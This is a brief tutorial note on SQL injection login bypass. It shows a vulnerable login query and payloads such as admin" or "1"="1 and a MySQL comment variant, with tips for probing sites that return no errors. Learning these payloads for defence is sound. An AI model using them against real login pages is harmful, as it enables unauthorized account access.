---
title: Classic Injection Bypass
tags:
  - security
  - sqli
  - web
date: 2024-01-28 14:15:56 -0600
updated: 2024-01-28 14:15:56 -0600
---

On Login Page the value for username and password is controlled by the user

````sql
-- Backend Query Sample
SELECT * 
FROM login 
WHERE username="$USERNAME" AND password="$PASSWORD"; 
````

We can enter the values as `admin" or "1"="1` which forms valid SQL query
1=1 is always true and the OR clause nullifies the WHERE statement

````sql
SELECT * 
FROM login 
WHERE username="admin" OR "1"="1" AND password="admin" OR "1"="1";
````

`#` is considered as comment in MySQL. So second half off query is ignored

````sql
SELECT * 
FROM login 
WHERE username="admin" OR 1=1#" and password="admin";
````

Depending on DB being used different types of comments can be used
For string values " or ' will be used depending on DB
If the input field only takes numbers then `1' or 1=1#` can be used
Not all websites is going to produce error so play around with ', and, or (True and False) statements are check if desired output is produced
